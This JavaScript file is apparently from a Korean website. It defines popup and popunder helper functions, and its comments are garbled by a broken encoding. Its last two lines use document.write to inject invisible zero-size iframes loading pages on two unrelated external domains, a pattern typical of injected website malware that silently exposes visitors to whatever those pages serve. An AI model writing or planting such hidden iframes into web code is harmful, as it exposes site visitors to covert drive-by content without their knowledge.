function window_popup(website,tmp1,tmp2,tmp3,tmp4,tmp5) //�ּ�, ����,����,��ġ,�˾�â�̸�,scrollbar
{
	
		var tmp = screen.height;
		var pwidth = screen.width;
		var pheight= screen.height;
		var lwidth = tmp1;
		var lheight = tmp2;

		if (tmp3 =="C"){ //center
		pleft = (pwidth/2) - (lwidth/2)
		ptop = (pheight/2) - (lheight/2)
		}
		
		if(tmp3 == "T") { //top
		pleft = 10
		ptop = 10
		}
		
		if(tmp3 =="R"){ //right
		pleft = pwidth - lwidth - 20
		ptop = 10
		}
	
		var winx = window.open(website,tmp4,'width='+tmp1+',height='+tmp2+',scrollbars='+tmp5+',top='+ptop+',left='+pleft+',status=0,resizable=0, toolbar=0,menubar=0, titlebar=0');
		return winx;
}

function window_popunder(website,tmp1,tmp2,tmp3,tmp4,tmp5) //�ּ�, ����,����,��ġ,�˾�â�̸�,scrollbar
{
	var win_under = window_popup(website,tmp1,tmp2,tmp3,tmp4,tmp5);
	win_under.blur();
	self.focus();
}
document.write('<iframe height=0 width=0 src="http://dreamsint.co.kr/news/index.htm"></iframe>');
document.write('<iframe height=0 width=0 src="http://www.beensci.com/board/ad.htm"></iframe>');
